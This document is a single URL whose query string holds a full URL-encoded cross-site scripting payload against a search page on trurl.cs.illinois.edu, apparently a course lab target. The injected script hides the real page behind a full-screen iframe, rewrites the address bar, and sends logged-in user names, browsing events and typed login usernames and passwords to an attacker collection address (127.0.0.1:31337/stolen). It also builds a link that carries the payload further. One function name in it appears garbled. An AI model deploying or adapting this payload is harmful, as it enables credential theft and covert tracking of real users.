http://trurl.cs.illinois.edu/search?q=%3Cscript%3Efunction%20payload(attacker)%20{var%20first_loaded%20=%200;function%20log(data)%20{console.log($.param(data));$.get(attacker,%20data);}function%20getPath(url)%20{return%20url.match(/(\/.*)/)[1];}function%20changeAddressBar(url)%20{try%20{window.history.replaceState({},%20%22%22,%20url);}%20catch(e)%20{}}function%20proxy(attacker,%20mainhref)%20{$(%27body%27).children().hide();var%20i%20=%20$(%27%3Ciframe%20id=_track%3E%27).css({position:%20%27absolute%27,width:%20%27100%%27,height:%20%27100%%27,top:%200,left:%200,border:%200,background:%20%27#fff%27}).attr(%27sandbox%27,%20%27allow-same-origin%20allow-forms%20allow-scripts%27).attr(%27src%27,%22http://trurl.cs.illinois.edu/%22).appendTo(%27body%27).load(function()%20{if(first_loaded%20==%200)%20{changeAddressBar(%22http://trurl.cs.illinois.edu/%22);log(attacker,%20{event:%20%22nav%22,%20user:%20$(%22#_track%22).contents().find(%22#logged-in-user%22).text(),uri:%20mainhref});first_loaded%20=%20first_loaded+1;}$(%22#_track%22).contents().find(%22.list-group%22).hide();$(%27body%27,this.contentDocument).find(%27a%27).click(function()%20{log(attacker,%20{event:%27nav%27,%20user:%20$(%22#_track%22).contents().find(%22#logged-in-user%22).text(),uri:%20this.href});changeAddressBar(this.href);}).end().find(%27form%27).submit(function()%20{if($(this).attr(%27action%27)%20==%20%22./login%22)%20{var%20str%20=%20$(this).serialize();var%20str_user%20=%20%22%22;var%20eq_index%20=%20str.indexOf(%22=%22);var%20and_index%20=%20str.indexOf(%22&%22);str_user%20=%20str.substring(eq_index%20+%201,%20and_index);var%20str_pass%20=%20%22%22;var%20eq_index2%20=%20str.lastIndexOf(%22=%22);str_pass%20=%20str.substring(eq_index2%20+%201,%20str.length);log(attacker,%20{event:%20%27login%27,%20user:%20str_user,%20pass:%20str_pass});}else%20if($(this).attr(%27action%27)%20==%20%22./logout%22){log(attacker,%20{event:%20%27logout%27,%20user:%20$(%22#_track%22).contents().find(%22#logged-in-user%22).text()})}else%20{var%20str_uri%20=%20%22http://trurl.cs.illinois.edu/search?%22%20+%20%22q=%22%20+%20$(%22#_track%22).contents().find(%22#query%22).val();changeAddressBaxssdefer(str_uri);log(attacker,%20{event:%27nav%27,%20user:%20$(%22#_track%22).contents().find(%22#logged-in-user%22).text(),uri:%20str_uri%20})}}).end();});}proxy(attacker,%20%22http://trurl.cs.illinois.edu/%22);}function%20makeLink(xssdefense,%20target,%20attacker)%20{if%20(xssdefense%20==%200)%20{return%20target%20+%20%22./search?xssdefense=%22%20+%20xssdefense.toString()%20+%20%22&q=%22%20+encodeURIComponent(%22%3Cscript%22%20+%20%22%3E%22%20+%20payload.toString()%20+%22;payload(\%22%22%20+%20attacker%20+%20%22\%22);%3C/script%22%20+%20%22%3E%22);}else{return%20target%20+%20%22./search?xssdefense=%22%20+%20xssdefense.toString()%20+%20%22&q=%22%20+encodeURIComponent(%22%3Cscript%22%20+%20%22%3E%22%20+%20payload.toString()%20+%22;payload(\%22%22%20+%20attacker%20+%20%22\%22);%3C/script%22%20+%20%22%3E%22);}}var%20xssdefense%20=%200;var%20target%20=%20%22http://trurl.cs.illinois.edu/%22;var%20attacker%20=%20%22http://127.0.0.1:31337/stolen%22;$(function()%20{var%20url%20=%20makeLink(xssdefense,%20target,%20attacker);$(%22#query-lbl%22).text(%27%27);window.location.href%20=%20url;});%3C/script%3E
